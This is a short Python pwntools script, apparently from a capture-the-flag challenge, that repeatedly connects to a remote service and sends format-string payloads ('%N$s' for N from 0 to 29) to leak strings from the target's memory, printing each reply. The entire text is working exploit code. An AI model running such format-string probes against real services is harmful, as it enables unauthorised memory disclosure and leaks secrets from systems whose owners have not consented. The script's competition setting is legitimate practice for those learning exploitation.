from pwn import *

for i in range(30):
	p = remote('tcp.ybn.sg', 25399)
	p.sendlineafter(':', '%' + str(i) + '$s')
	resp = p.recvuntil('Give')
	print(resp)
	p.close()
